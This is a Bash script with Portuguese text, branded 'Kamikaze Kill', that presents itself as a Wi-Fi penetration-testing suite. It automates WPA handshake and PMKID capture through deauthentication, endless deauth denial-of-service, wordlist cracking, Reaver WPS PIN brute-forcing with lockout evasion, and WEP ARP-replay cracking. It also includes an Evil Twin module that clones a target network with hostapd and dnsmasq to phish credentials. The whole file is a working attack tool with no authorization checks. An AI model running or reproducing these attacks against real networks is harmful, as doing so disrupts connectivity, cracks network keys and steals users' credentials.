#!/bin/bash

# Cores e Variáveis
red=$(tput setaf 1)
green=$(tput setaf 2)
yellow=$(tput setaf 3)
blue=$(tput setaf 4)
reset=$(tput sgr0)

log="kamikaze-log.txt"
timestamp=$(date "+%Y-%m-%d %H:%M:%S")

clear
echo "${red}"
echo "██╗  ██╗ █████╗ ███╗   ███╗██╗██╗  ██╗ █████╗ ███████╗███████╗    ██╗  ██╗██╗██╗      ██╗      "
echo "██║ ██╔╝██╔══██╗████╗ ████║██║██║ ██╔╝██╔══██╗██╔════╝██╔════╝    ██║ ██╔╝██║██║      ██║      "
echo "█████╔╝ ███████║██╔████╔██║██║█████╔╝ ███████║███████╗█████╗      █████╔╝ ██║██║      ██║      "
echo "██╔═██╗ ██╔══██║██║╚██╔╝██║██║██╔═██╗ ██╔══██║╚════██║██╔══╝      ██╔═██╗ ██║██║      ██║      "
echo "██║  ██╗██║  ██║██║ ╚═╝ ██║██║██║  ██╗██║  ██║███████║███████╗    ██║  ██╗██║███████╗ ███████╗"
echo "╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝  ╚═╝╚═╝╚══════╝ ╚══════╝"
echo "${yellow}                            🔥 Suíte de Pentest Wi-Fi (v2.0) 🔥${reset}"
echo "${yellow}                               🛠️ Desenvolvido por Gustavo 🛠️ ${reset}"
echo ""

# Loop principal para manter o menu ativo
while true; do
    echo "${blue}Escolha uma opção:${reset}"
    echo "${yellow}[1] Escanear/Capturar/Ataque (Handshake/PMKID/DoS)${reset}"
    echo "${yellow}[2] Quebrar Senha (WPA/WPS/WEP)${reset}"
    echo "${yellow}[3] Ataques Avançados/Phishing${reset}${reset}"
    echo "${yellow}[4] Ver Logs${reset}"
    echo "${yellow}[0] Sair${reset}"
    echo ""
    read -p "[?] Selecione uma opção > " opcao

    case $opcao in
        1)
            # MÓDULO 1: CAPTURA E ATAQUE (Mantido)
            # ... (código da Opção 1, Sub-opções 1, 2, 3)
            echo "${green}[*] Iniciando preparação e escaneamento...${reset}"

            iface=$(iw dev | awk '$1=="Interface"{print $2}')
            echo "${blue}[✓] Interface detectada: $iface${reset}"

            echo "${yellow}[*] Matando processos que atrapalham e ativando modo monitor...${reset}"
            sudo airmon-ng check kill
            sudo airmon-ng start "$iface" >/dev/null

            mon_iface=$(iwconfig 2>/dev/null | grep -B1 "Mode:Monitor" | head -n1 | awk '{print $1}')
            if [ -z "$mon_iface" ]; then
                echo "${red}[✗] Falha ao ativar modo monitor. Verifique seu adaptador.${reset}"
                exit 1
            fi

            echo "${blue}[✓] Interface em modo monitor: $mon_iface${reset}"
            echo ""

            echo "${blue}Escolha o método de ataque/captura:${reset}"
            echo "${yellow}[1] Ataque Deauth Clássico (Captura de 4-way Handshake)${reset}"
            echo "${yellow}[2] Ataque PMKID (Captura rápida sem cliente, requer hcxdumptool)${reset}"
            echo "${yellow}[3] Ataque DoS (Desautenticação Massiva)${reset}"
            echo "${yellow}[0] Voltar${reset}"
            read -p "[?] Selecione a sub-opção > " captura_opcao

            case $captura_opcao in
                1)
                    # Lógica do Ataque Deauth Clássico (Captura de Handshake)
                    echo "${yellow}[*] Escaneando redes em tempo real (Deauth)...${reset}"
                    echo "${blue}Pressione CTRL+C quando encontrar a rede desejada.${reset}"
                    sleep 2
                    sudo airodump-ng "$mon_iface"

                    echo ""
                    read -p "Digite o BSSID da rede alvo: " bssid
                    read -p "Digite o canal da rede: " channel
                    read -p "MAC do cliente (ou deixe vazio para broadcast): " client
                    
                    while true; do
                        read -p "Nome do arquivo para salvar o handshake (ex: alvo): " capfile
                        if [ -n "$capfile" ]; then
                            break
                        else
                            echo "${red}[!] O nome do arquivo não pode ser vazio. Por favor, digite um nome válido.${reset}"
                        fi
                    done
                    
                    read -p "Quantidade de pacotes de desauth (ex: 5): " count

                    echo "[$timestamp] Iniciando ataque Deauth para captura" >> $log
                    
                    echo "${yellow}[*] Capturando handshake. Pressione CTRL+C se a captura falhar.${reset}"
                    sleep 2
                    
                    sudo airodump-ng --bssid "$bssid" --channel "$channel" --write "$capfile" "$mon_iface" &
                    AIRODUMP_PID=$!
                    sleep 5
                    
                    echo "${yellow}[*] Executando ataque Deauth de $count pacotes no canal $channel...${reset}"
                    if [ -z "$client" ]; then 
                        sudo aireplay-ng --deauth "$count" -a "$bssid" "$mon_iface" & 
                    else 
                        sudo aireplay-ng --deauth "$count" -a "$bssid" -c "$client" "$mon_iface" & 
                    fi
                    AIREPLAY_PID=$!
                    wait $AIREPLAY_PID

                    sleep 10
                    kill $AIRODUMP_PID 2>/dev/null

                    echo "${yellow}[*] Verificando handshake...${reset}"
                    if [ -f "$capfile-01.cap" ]; then
                         if aircrack-ng "$capfile-01.cap" | grep -q "WPA handshake"; then
                             echo "${green}[✓] Handshake capturado com sucesso!${reset}"
                             echo "[$timestamp] Handshake capturado." >> $log
                         else
                             echo "${red}[✗] Arquivo de captura gerado, mas Handshake não encontrado dentro. Tente novamente.${reset}"
                             echo "[$timestamp] Handshake falhou. Arquivo gerado, mas vazio." >> $log
                         fi
                    else
                        echo "${red}[✗] Arquivo $capfile-01.cap não foi gerado. Verifique o BSSID/Canal.${reset}"
                        echo "[$timestamp] Handshake falhou. Arquivo CAP não gerado." >> $log
                    fi
                    ;;

                2)
                    ## Lógica do Ataque PMKID para hcxdumptool v7.0.0+
                    
                    if ! command -v hcxdumptool >/dev/null; then
                         echo "${red}[✗] Dependências faltando! Instale 'hcxtools'.${reset}"
                         echo "[$timestamp] Falha: Dependências hcx faltando." >> $log
                         break
                    fi

                    echo "${yellow}[*] Capturando PMKID. Pressione CTRL+C após 30-60 segundos ou ao ver o BSSID na tela.${reset}"
                    read -p "Nome do arquivo para salvar o PMKID (ex: teste): " pmkidfile
                    pmkid_cap="$pmkidfile.pcap"
                    hcxconvert_output="$pmkidfile.hc22000"

                    echo "[$timestamp] Iniciando ataque PMKID" >> $log
                    
                    echo "${yellow}[*] Executando hcxdumptool com a sintaxe corrigida...${reset}"
                    sudo hcxdumptool --interface "$mon_iface" --capture_file "$pmkid_cap" --enable_status=1 --pmkid=1 --eapoltimeout=5
                    
                    if command -v hcxpcapngtool >/dev/null; then
                        echo "${yellow}[*] Convertendo para formato Hashcat/Aircrack usando hcxpcapngtool...${reset}"
                        sudo hcxpcapngtool -o "$hcxconvert_output" "$pmkid_cap"
                    elif command -v hcxpcaptool >/dev/null; then
                         echo "${yellow}[*] Convertendo para formato Hashcat/Aircrack usando hcxpcaptool...${reset}"
                         sudo hcxpcaptool -o "$hcxconvert_output" "$pmkid_cap"
                    else
                        echo "${red}[✗] Ferramenta de conversão (hcxpcapngtool/hcxpcaptool) não encontrada. Tentando com a saída bruta.${reset}"
                        hcxconvert_output="$pmkid_cap"
                    fi
                    
                    if [ -s "$hcxconvert_output" ]; then
                        echo "${green}[✓] PMKID capturado e salvo em: $hcxconvert_output${reset}"
                        echo "[$timestamp] PMKID capturado." >> $log
                    else
                        echo "${red}[✗] Falha na captura do PMKID. Arquivo vazio. Verifique se o AP suporta PMKID.${reset}"
                        echo "[$timestamp] PMKID falhou." >> $log
                    fi
                    ;;

                3)
                    # Lógica do Ataque DoS (Desautenticação Massiva)
                    echo "${red}-----------------------------------------------------------${reset}"
                    echo "${red}!!! AVISO: ESTE É UM ATAQUE DE NEGAÇÃO DE SERVIÇO (DoS) !!!${reset}"
                    echo "${red}-----------------------------------------------------------${reset}"
                    echo ""
                    
                    echo "${yellow}[*] Escaneando redes em tempo real...${reset}"
                    echo "${blue}Pressione CTRL+C quando encontrar a rede desejada.${reset}"
                    sleep 2
                    sudo airodump-ng "$mon_iface"

                    echo ""
                    read -p "Digite o BSSID da rede alvo: " bssid_dos
                    read -p "Digite o canal da rede: " channel_dos
                    read -p "MAC do cliente Específico (ou deixe vazio para atacar todos): " client_dos
                    
                    echo "[$timestamp] Iniciando ataque DoS massivo" >> $log
                    
                    echo "${yellow}[*] Mudando interface para o canal ${channel_dos}...${reset}"
                    sudo iwconfig "$mon_iface" channel "$channel_dos"
                    
                    echo "${red}!!! Ataque DoS Iniciado. Pressione CTRL+C para PARAR. !!!${reset}"

                    if [ -z "$client_dos" ]; then
                        sudo aireplay-ng --deauth 0 -a "$bssid_dos" "$mon_iface"
                    else
                        sudo aireplay-ng --deauth 0 -a "$bssid_dos" -c "$client_dos" "$mon_iface"
                    fi
                    
                    echo "[$timestamp] Ataque DoS Interrompido pelo usuário." >> $log
                    ;;


                0)
                    echo "${yellow}[*] Voltando ao menu principal...${reset}"
                    ;;

                *)
                    echo "${red}[!] Opção de ataque/captura inválida.${reset}"
                    ;;
            esac
            
            if [ -n "$mon_iface" ]; then
                sudo airmon-ng stop "$mon_iface" >/dev/null
            fi
            ;; # Fim da Opção 1

        2)
            # MÓDULO 2: QUEBRA DE SENHA (Mantido)
            # ... (código da Opção 2, Sub-opções 1, 2, 3)
            echo "${green}[*] Módulo de quebra de senha ativado.${reset}"
            echo "${blue}Escolha o método de ataque:${reset}"
            echo "${yellow}[1] Quebra de Handshake/PMKID (Wordlist)${reset}"
            echo "${yellow}[2] Ataque WPS (Reaver/Bully - Anti-Lockout)${reset}"
            echo "${yellow}[3] Quebra de WEP (ARP Replay Attack)${reset}" 
            echo "${yellow}[0] Voltar${reset}"
            read -p "[?] Selecione uma sub-opção > " sub_opcao

            case $sub_opcao in
                1)
                    ## 2.1 Quebra de Handshake/PMKID
                    echo "${green}[*] Módulo de Quebra de Handshake/PMKID ativado.${reset}"
                    read -p "Nome do arquivo .cap ou .hc22000: " capfile
                    
                    if [ -f "$capfile" ]; then
                        read -p "Caminho para a wordlist (Padrão: /usr/share/wordlists/rockyou.txt): " wordlist_path
                        wordlist_path=${wordlist_path:-/usr/share/wordlists/rockyou.txt} 

                        if [ -f "$wordlist_path" ]; then
                            echo "${yellow}[*] Tentando quebrar a senha usando aircrack-ng...${reset}"
                            sudo aircrack-ng "$capfile" -w "$wordlist_path" | tee -a $log
                            echo "${blue}📝 Log atualizado em:${reset} $(pwd)/$log"
                        else
                            echo "${red}[✗] Wordlist não encontrada em $wordlist_path.${reset}"
                        fi
                    else
                        echo "${red}[✗] Arquivo $capfile não encontrado.${reset}"
                    fi
                    ;;

                2)
                    ## 2.2 Ataque WPS (Anti-Lockout)
                    echo "${green}[*] Módulo de Ataque WPS (Anti-Lockout AVANÇADO) ativado.${reset}"
                    
                    mon_iface=$(iwconfig 2>/dev/null | grep "Mode:Monitor" | awk '{print $1}' | head -n1)
                    if [ -z "$mon_iface" ]; then
                        echo "${red}[✗] Nenhuma interface em modo monitor detectada.${reset}"
                        echo "${yellow}[*] Por favor, ative o modo monitor (Opção 1) ou manualmente.${reset}"
                        break
                    fi
                    echo "${blue}[✓] Interface em modo monitor detectada: $mon_iface${reset}"
                    
                    echo "${yellow}[*] Escaneando redes com WPS ativo (Pressione CTRL+C quando pronto)...${reset}"
                    sudo wash -i "$mon_iface"

                    read -p "Digite o BSSID da rede alvo WPS: " bssid_wps
                    read -p "Digite o canal da rede alvo WPS: " channel_wps
                    
                    read -p "Tempo de espera APÓS BLOQUEIO em segundos (Sugestão: 60-180): " lock_delay
                    lock_delay=${lock_delay:-60}
                    
                    echo "${yellow}[*] Iniciando ataque Reaver LENTO (Atraso: 2s, Lock Delay: ${lock_delay}s)...${reset}"
                    echo "[$timestamp] Iniciando ataque Reaver LENTO no BSSID: $bssid_wps (Lock Delay: ${lock_delay}s)" >> $log
                    
                    sudo reaver -i "$mon_iface" -b "$bssid_wps" -c "$channel_wps" -vv --no-nacks -d 2 -l "$lock_delay" | tee -a $log

                    echo "${blue}📝 Log atualizado em:${reset} $(pwd)/$log"
                    ;;

                3)
                    ## 2.3 Quebra de WEP (ARP Replay Attack)
                    echo "${green}[*] Módulo de Quebra WEP (ARP Replay Attack) ativado.${reset}"
                    
                    mon_iface=$(iwconfig 2>/dev/null | grep "Mode:Monitor" | awk '{print $1}' | head -n1)
                    if [ -z "$mon_iface" ]; then
                        echo "${red}[✗] Nenhuma interface em modo monitor detectada. Ative primeiro.${reset}"
                        break
                    fi
                    echo "${blue}[✓] Interface em modo monitor detectada: $mon_iface${reset}"

                    echo "${yellow}[*] Escaneando redes WEP (Pressione CTRL+C)...${reset}"
                    sudo airodump-ng "$mon_iface"
                    
                    read -p "Digite o BSSID da rede WEP alvo: " bssid_wep
                    read -p "Digite o canal da rede WEP: " channel_wep
                    read -p "Nome do arquivo para salvar a captura WEP: " capfile_wep

                    echo "[$timestamp] Iniciando Ataque WEP" >> $log
                    
                    echo "${yellow}[*] 1. Capturando pacotes de dados. Aguarde o DATA Count subir...${reset}"
                    sudo airodump-ng --bssid "$bssid_wep" --channel "$channel_wep" --write "$capfile_wep" "$mon_iface" &
                    AIRODUMP_WEP_PID=$!
                    sleep 10
                    
                    echo "${yellow}[*] 2. Iniciando ARP Replay Attack (Injeção). Pressione CTRL+C quando houver 20k+ DATA.${reset}"
                    sudo aireplay-ng -3 -b "$bssid_wep" "$mon_iface"
                    
                    kill $AIRODUMP_WEP_PID 2>/dev/null

                    echo "${yellow}[*] 3. Tentando quebrar a chave WEP...${reset}"
                    sudo aircrack-ng "$capfile_wep-01.cap" | tee -a $log
                    
                    echo "${blue}📝 Log atualizado em:${reset} $(pwd)/$log"
                    ;;
                    
                0)
                    echo "${yellow}[*] Voltando ao menu principal...${reset}"
                    ;;

                *)
                    echo "${red}[!] Sub-opção inválida.${reset}"
                    ;;
            esac
            ;; 

        3)
            ## NOVO MÓDULO 3: ATAQUES AVANÇADOS/ESPECÍFICOS
            echo "${green}[*] Módulo de Ataques Avançados ativado.${reset}"
            echo "${blue}Escolha o ataque avançado:${reset}"
            echo "${yellow}[1] Evil Twin Attack (Phishing de Credenciais)${reset}"
            echo "${yellow}[0] Voltar${reset}"
            read -p "[?] Selecione uma sub-opção > " avancado_opcao

            case $avancado_opcao in
                1)
                    # Evil Twin Attack (Phishing)
                    echo "${red}-----------------------------------------------------------${reset}"
                    echo "${red}!!! ATENÇÃO: EVIL TWIN REQUER 2 INTERFACES DE REDE!!!${reset}"
                    echo "${red}!!! Uma para o AP Falso e outra para o Deauth. !!!${reset}"
                    echo "${red}-----------------------------------------------------------${reset}"
                    
                    # Verificação de dependências (hostapd e dnsmasq são cruciais)
                    if ! command -v hostapd >/dev/null || ! command -v dnsmasq >/dev/null; then
                        echo "${red}[✗] Dependências faltando! Instale 'hostapd' e 'dnsmasq'.${reset}"
                        echo "[$timestamp] Falha: Dependências Hostapd/DNSMASQ faltando." >> $log
                        break
                    fi

                    echo "${yellow}[*] Iniciando Escaneamento de Alvos...${reset}"
                    
                    # A Opção 1 já colocou a wlan0 em modo monitor, vamos usá-la para o Deauth.
                    read -p "Digite o BSSID do AP Alvo (rede a ser clonada): " ap_bssid
                    read -p "Digite o Canal do AP Alvo: " ap_channel
                    read -p "Digite o ESSID (Nome) do AP Alvo (ex: Vivo 6g): " ap_essid
                    
                    echo "${yellow}[*] Configurando Interface para AP Falso (Ex: wlan1)...${reset}"
                    read -p "Digite o nome da interface para o AP Falso (ex: wlan1): " ap_iface
                    
                    # 1. Configurar Hostapd (Criar AP falso)
                    # Criação de arquivo hostapd.conf temporário (simplificado)
                    cat > /tmp/hostapd.conf <<EOF
interface=$ap_iface
ssid=$ap_essid
channel=$ap_channel
driver=nl80211
EOF
                    
                    # 2. Configurar DNSMASQ (Servidor DHCP e DNS para o AP Falso)
                    # Criação de arquivo dnsmasq.conf temporário (simplificado)
                    cat > /tmp/dnsmasq.conf <<EOF
interface=$ap_iface
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
log-queries
EOF
                    
                    echo "${yellow}[*] 1. Atribuindo IP e levantando interface do AP Falso...${reset}"
                    sudo ifconfig "$ap_iface" 10.0.0.1 netmask 255.255.255.0 up
                    
                    echo "${yellow}[*] 2. Iniciando Hostapd (AP Falso)...${reset}"
                    sudo hostapd /tmp/hostapd.conf &
                    HOSTAPD_PID=$!
                    sleep 5
                    
                    echo "${yellow}[*] 3. Iniciando DNSMASQ (DHCP/DNS)...${reset}"
                    sudo dnsmasq -C /tmp/dnsmasq.conf -d &
                    DNSMASQ_PID=$!
                    sleep 5
                    
                    echo "${yellow}[*] 4. Iniciando Ataque Deauth no AP REAL ($ap_bssid)...${reset}"
                    echo "${blue}Isso forçará clientes a se conectar ao seu AP Falso. Pressione CTRL+C para PARAR TUDO.${reset}"
                    
                    # Assumimos que a interface monitor ($mon_iface) está ativa da Opção 1, ou você a ativa aqui.
                    sudo aireplay-ng --deauth 0 -a "$ap_bssid" "$mon_iface"

                    # Se o aireplay-ng for interrompido, o script continua aqui para limpar
                    echo "${yellow}[*] Ataque Evil Twin Interrompido. Limpando processos...${reset}"
                    kill $HOSTAPD_PID 2>/dev/null
                    kill $DNSMASQ_PID 2>/dev/null
                    sudo pkill hostapd
                    sudo pkill dnsmasq
                    sudo ifconfig "$ap_iface" down
                    
                    echo "[$timestamp] Ataque Evil Twin Interrompido e processos limpos." >> $log
                    ;;
                0)
                    echo "${yellow}[*] Voltando ao menu principal...${reset}"
                    ;;
                *)
                    echo "${red}[!] Opção inválida.${reset}"
                    ;;
            esac
            ;;
        
        4)
            ## 4. VER LOGS (Antiga Opção 3)
            echo "${green}[*] Exibindo últimas linhas do log:${reset}"
            if [ -f "$log" ]; then
                tail -n 15 "$log"
            else
                echo "${yellow}[!] Arquivo de log não encontrado. Nenhum ataque registrado ainda.${reset}"
            fi
            ;;

        0)
            ## 0. SAIR
            echo "${red}[✗] Saindo da ferramenta.${reset}"
            exit 0
            ;;

        *)
            echo "${red}[!] Opção inválida.${reset}"
            ;;
    esac
    echo ""
done
